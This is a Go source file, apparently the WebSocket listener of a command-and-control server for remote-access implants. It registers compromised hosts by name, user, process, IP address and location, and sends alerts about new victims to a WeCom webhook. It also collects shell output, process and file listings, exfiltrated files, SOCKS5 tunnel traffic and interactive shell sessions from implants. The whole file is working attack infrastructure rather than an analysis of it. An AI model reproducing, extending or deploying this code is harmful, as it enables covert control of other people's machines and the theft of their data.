package websocket

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/interactive"
	"BackendTemplate/pkg/logger"
	"BackendTemplate/pkg/qqwry"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/webhooks"
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

// WSClient 结构体，封装WebSocket连接和相关数据
type WSClient struct {
	Conn            *websocket.Conn
	UID             string
	WriteMu         sync.Mutex
	StopChan        chan struct{}
	LastHeartbeat   time.Time
	TimeoutCount    int
	IsClosed        bool
	CloseOnce       sync.Once
	PingTicker      *time.Ticker
	HeartbeatTicker *time.Ticker
}

// ClientManager 全局连接管理器
type ClientManager struct {
	Clients map[string]*WSClient
	Mu      sync.RWMutex
}

var (
	globalClientManager = &ClientManager{
		Clients: make(map[string]*WSClient),
	}
)

// 安全分割OS信息函数
func safeSplitOSInfo(osInfo string) (hostName, userName, processName string) {
	if osInfo == "" {
		return "Unknown", "Unknown", "Unknown"
	}

	parts := strings.SplitN(osInfo, "\t", 3)
	switch len(parts) {
	case 3:
		return parts[0], parts[1], parts[2]
	case 2:
		return parts[0], parts[1], "Unknown"
	case 1:
		return parts[0], "Unknown", "Unknown"
	default:
		return "Unknown", "Unknown", "Unknown"
	}
}

// Add 添加客户端到管理器
func (cm *ClientManager) Add(uid string, client *WSClient) {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	cm.Clients[uid] = client
	logger.Info("Client added:", uid, "Total clients:", len(cm.Clients))
}

// Remove 从管理器移除客户端
func (cm *ClientManager) Remove(uid string) {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	if client, exists := cm.Clients[uid]; exists {
		if !client.IsClosed {
			client.Close()
		}
		delete(cm.Clients, uid)
		logger.Info("Client removed:", uid, "Total clients:", len(cm.Clients))
	}
}

// Get 获取客户端
func (cm *ClientManager) Get(uid string) (*WSClient, bool) {
	cm.Mu.RLock()
	defer cm.Mu.RUnlock()
	client, exists := cm.Clients[uid]
	return client, exists
}

// CloseAll 关闭所有客户端
func (cm *ClientManager) CloseAll() {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	for uid, client := range cm.Clients {
		if !client.IsClosed {
			client.Close()
		}
		delete(cm.Clients, uid)
	}
}

// Close 安全关闭客户端
func (c *WSClient) Close() {
	c.CloseOnce.Do(func() {
		c.IsClosed = true

		// 停止所有定时器
		if c.PingTicker != nil {
			c.PingTicker.Stop()
		}
		if c.HeartbeatTicker != nil {
			c.HeartbeatTicker.Stop()
		}

		// 关闭停止通道
		close(c.StopChan)

		// 关闭WebSocket连接
		if c.Conn != nil {
			c.Conn.Close()
		}

		// 从全局管理器移除
		if c.UID != "" {
			globalClientManager.Mu.Lock()
			delete(globalClientManager.Clients, c.UID)
			globalClientManager.Mu.Unlock()
		}

		// 从连接类型管理器移除
		connection.MuClientListenerType.Lock()
		delete(connection.ClientListenerType, c.UID)
		connection.MuClientListenerType.Unlock()

		// 更新数据库状态为离线
		if c.UID != "" {
			database.Engine.Where("uid = ?", c.UID).Update(&database.Clients{Online: "2"})
			logger.Info("Client marked as offline:", c.UID)
		}

		logger.Info("WebSocket connection closed for client:", c.UID)
	})
}

// WriteMessage 安全发送消息
func (c *WSClient) WriteMessage(message []byte) error {
	c.WriteMu.Lock()
	defer c.WriteMu.Unlock()

	if c.IsClosed {
		return fmt.Errorf("connection closed")
	}

	c.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	return c.Conn.WriteMessage(websocket.BinaryMessage, message)
}

// startPing 启动Ping定时器
func (c *WSClient) startPing() {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("Ping goroutine panic recovered:", r)
		}
	}()

	for {
		select {
		case <-c.PingTicker.C:
			if c.IsClosed {
				return
			}

			c.WriteMu.Lock()
			c.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if err := c.Conn.WriteMessage(websocket.PingMessage, nil); err != nil {
				c.WriteMu.Unlock()
				logger.Info("Ping failed, closing connection for client:", c.UID, "Error:", err)
				c.Close()
				return
			}
			c.WriteMu.Unlock()

		case <-c.StopChan:
			return
		}
	}
}

// startHeartbeatCheck 启动心跳检查
func (c *WSClient) startHeartbeatCheck() {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("Heartbeat checker panic recovered:", r)
		}
	}()

	for {
		select {
		case <-c.HeartbeatTicker.C:
			if c.IsClosed {
				return
			}

			// 检查心跳是否超时
			if time.Since(c.LastHeartbeat) > 30*time.Second {
				c.TimeoutCount++
				logger.Warn("Heartbeat timeout for client:", c.UID, "Timeout count:", c.TimeoutCount)

				if c.TimeoutCount >= 3 {
					logger.Info("Max heartbeat timeout reached, closing connection for client:", c.UID)
					c.Close()
					return
				}
			}

		case <-c.StopChan:
			return
		}
	}
}

// HandleWebSocket 处理WebSocket连接
func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
	logger.Info("New WebSocket connection attempt from:", r.RemoteAddr)

	defer func() {
		if r := recover(); r != nil {
			logger.Error("WebSocket handler panic recovered:", r)
		}
	}()

	// 升级HTTP连接为WebSocket
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		logger.Error("WebSocket upgrade failed:", err)
		return
	}

	logger.Info("WebSocket connection established from:", r.RemoteAddr)

	// 创建客户端对象
	client := &WSClient{
		Conn:          ws,
		StopChan:      make(chan struct{}),
		LastHeartbeat: time.Now(),
		IsClosed:      false,
	}

	defer func() {
		// 确保连接被关闭
		client.Close()
		logger.Info("WebSocket handler finished for:", r.RemoteAddr)
	}()

	// 设置连接参数
	ws.SetReadLimit(10 * 1024 * 1024) // 10MB最大消息大小
	ws.SetReadDeadline(time.Now().Add(60 * time.Second))
	ws.SetPongHandler(func(string) error {
		ws.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})

	// 启动Ping定时器
	client.PingTicker = time.NewTicker(30 * time.Second)
	go client.startPing()

	// 主消息处理循环
	for {
		if client.IsClosed {
			break
		}

		// 读取消息
		messageType, message, err := ws.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				logger.Info("WebSocket closed unexpectedly:", err, "from:", r.RemoteAddr)
			} else if websocket.IsCloseError(err) {
				logger.Info("WebSocket closed normally from:", r.RemoteAddr)
			} else if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				logger.Info("WebSocket read timeout from:", r.RemoteAddr)
			} else {
				logger.Error("WebSocket read error:", err, "from:", r.RemoteAddr)
			}
			break
		}

		// 只处理二进制消息
		if messageType != websocket.BinaryMessage {
			logger.Warn("Received non-binary message, ignoring from:", r.RemoteAddr)
			continue
		}

		if len(message) == 0 {
			logger.Warn("Received empty message, ignoring from:", r.RemoteAddr)
			continue
		}

		// 处理消息 - 添加基本长度检查
		if len(message) < 4 {
			logger.Error("Message too short from:", r.RemoteAddr)
			break
		}

		msgTypeBytes := message[:4]
		msgType := binary.BigEndian.Uint32(msgTypeBytes)

		switch msgType {
		case 1: // firstBlood
			if len(message) < 5 { // 至少需要类型+1字节数据
				logger.Error("FirstBlood message too short from:", r.RemoteAddr)
				break
			}

			msg := message[4:]
			if len(msg) == 0 {
				logger.Error("Empty FirstBlood payload from:", r.RemoteAddr)
				break
			}

			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				logger.Error("DecodeBase64 failed:", err, "from:", r.RemoteAddr)
				break
			}

			metainfo, err := encrypt.Decrypt(tmpMetainfo)
			if err != nil {
				logger.Error("Decrypt failed:", err, "from:", r.RemoteAddr)
				break
			}

			// 验证metainfo长度
			if len(metainfo) < 9 {
				logger.Error("Metainfo too short:", len(metainfo), "from:", r.RemoteAddr)
				break
			}

			uid := encrypt.BytesToMD5(metainfo)
			client.UID = uid
			client.LastHeartbeat = time.Now()
			client.TimeoutCount = 0

			// 添加到全局管理器
			globalClientManager.Add(uid, client)

			// 更新连接类型
			connection.MuClientListenerType.Lock()
			connection.ClientListenerType[uid] = "websocket"
			connection.MuClientListenerType.Unlock()

			// 启动心跳检查
			client.HeartbeatTicker = time.NewTicker(10 * time.Second)
			go client.startHeartbeatCheck()

			// 检查客户端是否已存在
			var existingClient database.Clients
			exists, _ := database.Engine.Where("uid = ?", uid).Get(&existingClient)

			if !exists { // FirstBlood
				// 安全解析数据
				if len(metainfo) < 9 {
					logger.Error("Metainfo too short for parsing from:", r.RemoteAddr)
					break
				}

				processID := binary.BigEndian.Uint32(metainfo[:4])
				flag := int(metainfo[4])
				ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
				localIP := utils.Uint32ToIP(ipInt).String()

				// 安全获取osInfo
				var osInfo string
				if len(metainfo) > 9 {
					osInfo = string(metainfo[9:])
				}

				// 使用安全分割函数
				hostName, UserName, processName := safeSplitOSInfo(osInfo)

				// 获取外网IP
				externalIp, _, err := net.SplitHostPort(r.RemoteAddr)
				if err != nil {
					externalIp = r.RemoteAddr
				}
				if externalIp == "::1" {
					externalIp = "127.0.0.1"
				}

				// 验证IP地址
				if net.ParseIP(externalIp) == nil {
					externalIp = "0.0.0.0"
				}

				address, _ := qqwry.GetLocationByIP(externalIp)

				currentTime := time.Now()
				timeFormat := "01-02 15:04"
				formattedTime := currentTime.Format(timeFormat)

				arch := "x86"

				if flag > 8 {
					UserName += "*"
					flag = flag - 8
				}
				if flag > 4 {
					arch = "x64"
				}

				// 创建新客户端记录
				c := database.Clients{
					Uid:        uid,
					FirstStart: formattedTime,
					ExternalIP: externalIp,
					InternalIP: localIP,
					Username:   UserName,
					Computer:   hostName,
					Process:    processName,
					Pid:        strconv.Itoa(int(processID)),
					Address:    address,
					Arch:       arch,
					Note:       "",
					Sleep:      "0",
					Online:     "1",
					Color:      "",
				}

				// 插入数据库 - 使用事务保证一致性
				session := database.Engine.NewSession()
				defer session.Close()

				if err := session.Begin(); err != nil {
					logger.Error("Failed to start transaction:", err)
					break
				}

				if _, err := session.Insert(&c); err != nil {
					session.Rollback()
					logger.Error("Failed to insert client:", err)
					break
				}

				if _, err := session.Insert(&database.Shell{Uid: uid, ShellContent: ""}); err != nil {
					session.Rollback()
					logger.Error("Failed to insert shell:", err)
					break
				}

				if _, err := session.Insert(&database.Notes{Uid: uid, Note: ""}); err != nil {
					session.Rollback()
					logger.Error("Failed to insert notes:", err)
					break
				}

				if err := session.Commit(); err != nil {
					logger.Error("Failed to commit transaction:", err)
				}

				// 发送Webhook通知
				if exists, key := webhooks.CheckEnable(); exists {
					webhooks.SendWecom(c, key)
				}

				logger.Info("New client registered:", uid, "IP:", externalIp)
			} else {
				// 更新在线状态
				database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "1"})
				logger.Info("Client reconnected:", uid)
			}

		case 2: // otherMsg
			if len(message) < 8 { // 至少需要类型+4字节长度+部分数据
				logger.Error("OtherMsg message too short from:", r.RemoteAddr)
				break
			}

			msg := message[4:]
			if len(msg) < 4 {
				logger.Error("OtherMsg too short")
				break
			}

			metaLen := binary.BigEndian.Uint32(msg[:4])

			// 验证metaLen的合理性
			if metaLen > uint32(len(msg)-4) {
				logger.Error("Invalid meta length:", metaLen, "available:", len(msg)-4)
				break
			}

			if metaLen == 0 {
				logger.Error("Zero meta length")
				break
			}

			metaMsg := msg[4 : 4+metaLen]
			realMsg := msg[4+metaLen:]

			// 验证realMsg不为空
			if len(realMsg) == 0 {
				logger.Error("Empty real message")
				break
			}

			tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
			if err != nil {
				logger.Error("DecodeBase64 failed:", err)
				break
			}

			metainfo, err := encrypt.Decrypt(tmpMetainfo)
			if err != nil {
				logger.Error("Decrypt failed:", err)
				break
			}

			uid := encrypt.BytesToMD5(metainfo)

			// 检查客户端是否在线
			if _, exists := globalClientManager.Get(uid); !exists {
				logger.Warn("Received message from offline client:", uid)
				break
			}

			dataBytes, err := encrypt.DecodeBase64(realMsg)
			if err != nil {
				logger.Error("DecodeBase64 failed:", err)
				break
			}

			dataBytes, err = encrypt.Decrypt(dataBytes)
			if err != nil {
				logger.Error("First decrypt failed:", err)
				break
			}

			dataBytes, err = encrypt.Decrypt(dataBytes)
			if err != nil {
				logger.Error("Second decrypt failed:", err)
				break
			}

			// 严格检查dataBytes长度
			if len(dataBytes) < 4 {
				logger.Error("Decrypted data too short:", len(dataBytes))
				break
			}

			replyTypeBytes := dataBytes[:4]
			data := dataBytes[4:]
			replyType := binary.BigEndian.Uint32(replyTypeBytes)

			switch replyType {
			case 0: // 命令行展示
				var shell database.Shell
				if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
					// 限制数据长度，防止过大的日志
					var content string
					if len(data) > 10000 {
						content = string(data[:10000]) + "\n[Data truncated...]"
					} else {
						content = string(data) + "\n"
					}

					shell.ShellContent += content
					database.Engine.Where("uid = ?", uid).Update(&shell)
				}

			case 31: // 错误展示
				var shell database.Shell
				if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
					// 限制数据长度，防止过大的日志
					var content string
					if len(data) > 10000 {
						content = string(data[:10000]) + "\n[Data truncated...]"
					} else {
						content = string(data)
					}

					shell.ShellContent += "!Error: " + content + "\n"
					database.Engine.Where("uid = ?", uid).Update(&shell)
				}

			case command.PS:
				if len(data) > 0 {
					command.VarPidQueue.Add(uid, string(data))
				}

			case command.FileBrowse:
				if len(data) > 0 {
					command.VarFileBrowserQueue.Add(uid, string(data))
				}

			case 22: // 文件下载第一条信息
				if len(data) < 8 { // 至少4字节长度+部分路径
					logger.Error("File download info too short")
					break
				}

				fileLen := int(binary.BigEndian.Uint32(data[:4]))
				if len(data) < 5 { // 至少4字节长度+1字节路径
					logger.Error("No file path in download info")
					break
				}

				filePath := string(data[4:])
				if filePath == "" {
					logger.Error("Empty file path")
					break
				}

				// 验证文件长度合理性
				if fileLen <= 0 {
					logger.Error("Invalid file length:", fileLen)
					break
				}

				// 使用安全路径函数
				fullPath, err := utils.GetSafeFilePath(uid, filePath)
				if err != nil {
					logger.Error("Security check failed:", err)
					break
				}

				// 确保下载目录存在
				downloadDir := filepath.Dir(fullPath)
				if err := os.MkdirAll(downloadDir, 0755); err != nil {
					logger.Error("Failed to create download directory:", err)
					break
				}

				// 更新数据库
				sql := `
UPDATE downloads
SET file_size = ?, downloaded_size = ?
WHERE uid = ? AND file_path = ?;
`
				_, err = database.Engine.QueryString(sql, fileLen, 0, uid, filePath)
				if err != nil {
					logger.Error("Database update failed:", err)
				}

				// 检查并删除已存在的文件
				if _, err := os.Stat(fullPath); err == nil {
					if err := os.Remove(fullPath); err != nil {
						logger.Error("Failed to remove existing file:", err)
						break
					}
				}

				// 创建新文件
				fp, err := os.OpenFile(fullPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
				if err != nil {
					logger.Error("Failed to create file:", err)
					break
				}
				fp.Close()

			case command.DOWNLOAD: // 文件下载
				if len(data) < 8 { // 至少4字节路径长度+部分路径+部分内容
					logger.Error("Download data too short")
					break
				}

				filePathLen := int(binary.BigEndian.Uint32(data[:4]))
				if len(data) < 4+filePathLen {
					logger.Error("Invalid file path length in download")
					break
				}

				if filePathLen == 0 {
					logger.Error("Zero file path length")
					break
				}

				filePath := string(data[4 : 4+filePathLen])
				fileContent := data[4+filePathLen:]

				// 使用安全路径函数
				fullPath, err := utils.GetSafeFilePath(uid, filePath)
				if err != nil {
					logger.Error("Security check failed:", err)
					break
				}

				var fileDownloads database.Downloads
				if _, err := database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Get(&fileDownloads); err == nil {
					fileDownloads.DownloadedSize += len(fileContent)
					database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Update(&fileDownloads)
				}

				// 确保目录存在
				downloadDir := filepath.Dir(fullPath)
				if err := os.MkdirAll(downloadDir, 0755); err != nil {
					logger.Error("Failed to create download directory:", err)
					break
				}

				// 追加文件内容
				fp, err := os.OpenFile(fullPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
				if err != nil {
					logger.Error("Failed to open file:", err)
					break
				}

				if _, err := fp.Write(fileContent); err != nil {
					logger.Error("Failed to write file content:", err)
				}
				fp.Close()

			case command.DRIVES:
				if len(data) > 0 {
					drives := utils.GetExistingDrives(data)
					command.VarDrivesQueue.Add(uid, drives)
				}

			case command.FileContent:
				if len(data) < 8 { // 至少4字节路径长度+部分路径+部分内容
					logger.Error("File content data too short")
					break
				}

				filePathLen := int(binary.BigEndian.Uint32(data[:4]))
				if len(data) < 4+filePathLen {
					logger.Error("Invalid file path length in file content")
					break
				}

				if filePathLen == 0 {
					logger.Error("Zero file path length")
					break
				}

				filePath := string(data[4 : 4+filePathLen])
				fileContent := data[4+filePathLen:]
				command.VarFileContentQueue.Add(uid, filePath, string(fileContent))

			case command.Socks5Data:
				if len(data) < 16 {
					logger.Error("Socks5 data too short")
					break
				}

				md5sign := data[:16]
				rawData := data[16:]
				command.VarSocks5Queue.Add(uid, fmt.Sprintf("%x", md5sign), string(rawData))
			case command.WriteInteractieShell:
				sessionIDLen := int(binary.BigEndian.Uint32(data[:4]))

				sessionID := string(data[4 : 4+sessionIDLen])
				output := data[4+sessionIDLen:]

				interactive.SendOutputToSession(uid, sessionID, output)
			default:
				logger.Warn("Unknown reply type:", replyType)
			}

		case 3: // heartBeat
			if len(message) < 5 { // 至少需要类型+1字节数据
				logger.Error("HeartBeat message too short from:", r.RemoteAddr)
				break
			}

			msg := message[4:]
			if len(msg) == 0 {
				logger.Error("Empty HeartBeat payload from:", r.RemoteAddr)
				break
			}

			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				logger.Error("DecodeBase64 failed:", err)
				break
			}

			metainfo, err := encrypt.Decrypt(tmpMetainfo)
			if err != nil {
				logger.Error("Decrypt failed:", err)
				break
			}

			uid := encrypt.BytesToMD5(metainfo)

			// 更新心跳时间
			if c, exists := globalClientManager.Get(uid); exists && !c.IsClosed {
				c.LastHeartbeat = time.Now()
				c.TimeoutCount = 0
			}

		default:
			logger.Warn("Unknown message type:", msgType, "from:", r.RemoteAddr)
		}
	}
}

// Cleanup 全局清理函数
func Cleanup() {
	logger.Info("Starting WebSocket cleanup...")
	globalClientManager.CloseAll()
	logger.Info("WebSocket cleanup completed")
}

// GetClientStats 获取客户端统计信息
func GetClientStats() map[string]interface{} {
	globalClientManager.Mu.RLock()
	defer globalClientManager.Mu.RUnlock()

	stats := make(map[string]interface{})
	stats["total_clients"] = len(globalClientManager.Clients)

	onlineCount := 0
	for _, client := range globalClientManager.Clients {
		if !client.IsClosed {
			onlineCount++
		}
	}
	stats["online_clients"] = onlineCount

	return stats
}

// GetClient 获取指定客户端
func GetClient(uid string) *WSClient {
	if client, exists := globalClientManager.Get(uid); exists && !client.IsClosed {
		return client
	}
	return nil
}

// SendToClient 向指定客户端发送消息
func SendToClient(uid string, message []byte) error {
	client := GetClient(uid)
	if client == nil {
		return fmt.Errorf("client not found or offline")
	}

	return client.WriteMessage(message)
}

// 测试用的main函数
func main() {
	http.HandleFunc("/ws", HandleWebSocket)

	logger.Info("Starting WebSocket server on :8080")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		log.Fatal("ListenAndServe: ", err)
	}
}
